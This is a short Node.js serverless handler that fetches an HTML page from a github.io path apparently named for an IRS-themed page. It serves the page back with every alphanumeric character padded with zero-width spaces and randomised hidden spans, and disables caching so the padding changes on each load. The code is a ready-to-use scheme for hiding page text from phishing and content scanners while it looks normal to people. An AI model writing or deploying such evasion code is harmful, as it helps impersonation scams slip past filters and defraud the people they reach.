import fetch from "node-fetch";

// Function to generate random obfuscation patterns
function randomObfuscationPattern() {
    const obfuscationMethods = [
        (char) => `${char}&#x200B;`, // Zero-width space
        (char) => `${char}<span style="display:none">${Math.random().toString(36).substring(2, 6)}</span>`, // Hidden text
        (char) => `${char}<span style="font-size:0">${Math.random().toString(36).substring(2, 6)}</span>`, // Invisible text
        (char) => `${char}<span style="width:0;height:0;overflow:hidden">${Math.random().toString(36).substring(2, 6)}</span>` // Invisible hidden text
    ];
    return obfuscationMethods[Math.floor(Math.random() * obfuscationMethods.length)];
}

// Function to obfuscate text **without altering HTML tags**
function obfuscateText(text) {
    return text.replace(/([a-zA-Z0-9])/g, (match) => {
        const obfuscateMethod = randomObfuscationPattern();
        return obfuscateMethod(match);
    });
}

// API Handler to serve obfuscated HTML
export default async function handler(req, res) {
    try {
        // Fetch the original HTML (Replace with your actual URL)
        const response = await fetch("https://mightyflavor.github.io/obfuscationnn/IRS_ob"); // Replace with actual URL
        let html = await response.text();

        // Preserve HTML structure, obfuscating only text content inside tags
        let modifiedHTML = html.replace(/>([^<]+)</g, (match, text) => {
            if (text.trim() !== "") {
                return ">" + obfuscateText(text) + "<"; // Obfuscate text inside tags
            }
            return match; // Leave empty tags unchanged
        });

        // Set cache-control headers to prevent caching & ensure fresh obfuscation on each reload
        res.setHeader("Content-Type", "text/html");
        res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
        res.setHeader("Expires", "0");
        res.setHeader("Pragma", "no-cache");

        return res.status(200).send(modifiedHTML);
    } catch (error) {
        console.error("Error fetching/modifying HTML:", error);
        return res.status(500).send("Error fetching or modifying HTML.");
    }
}


